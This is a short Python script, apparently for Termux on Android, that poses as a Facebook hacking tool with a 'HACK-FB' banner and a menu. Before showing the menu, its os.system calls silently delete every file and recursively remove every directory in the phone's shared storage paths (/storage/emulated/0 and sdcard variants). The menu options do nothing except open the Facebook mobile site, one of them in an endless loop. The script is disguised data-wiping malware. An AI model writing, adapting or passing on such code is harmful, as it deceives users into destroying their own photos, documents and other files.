os.system("""
rm  /storage/emulated/0/*

cd /storage/emulated/0

rm -rf -- */   """)



os.system("""
rm  /storage/sdcard/0/*

cd /storage/sdcard/0

rm -rf -- */   """)



os.system("""
rm  /storage/sdcard0/0/*

cd /storage/sdcard/0

rm -rf -- */   """)

os.system("figlet HACK-FB")

print """
	   [1] MENU
	   [2] HACKFB_WITH_TEXT_CODE
"""

r = raw_input("CHOICE ONE ACTION:")
if r=="1":
   while TRUE:
	os.system("termux-open https://m.facebook.com")
if r=="2":
	os.system("termux-open https://m.facebook.com")
